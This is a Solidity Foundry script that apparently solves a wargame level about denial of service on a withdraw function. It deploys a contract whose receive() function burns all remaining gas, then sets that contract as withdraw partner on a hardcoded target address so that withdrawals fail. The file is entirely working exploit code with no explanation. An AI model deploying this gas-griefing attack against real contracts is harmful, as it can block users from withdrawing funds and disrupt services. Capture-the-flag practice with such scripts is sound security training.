// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Attack {
  uint256[] array;

  receive() external payable {
    while (gasleft() > 0) {
      array.push(0);
    }
  }
}

contract Solve is Script, Test {
  address target = address(0x6ad28025eD66A4e19763b130EF1F0BD02E81D423);

  function run() public {
    vm.startBroadcast();

    Attack attack = new Attack();
    (bool success, ) = address(target).call(abi.encodeWithSignature("setWithdrawPartner(address)", address(attack)));
    require(success, "Failed to set withdraw partner");

    /* (success, ) = address(target).call{gas: 500}(abi.encodeWithSignature("withdraw()"));
    require(!success, "Call must be DDoSed"); */

    vm.stopBroadcast();
  }
}
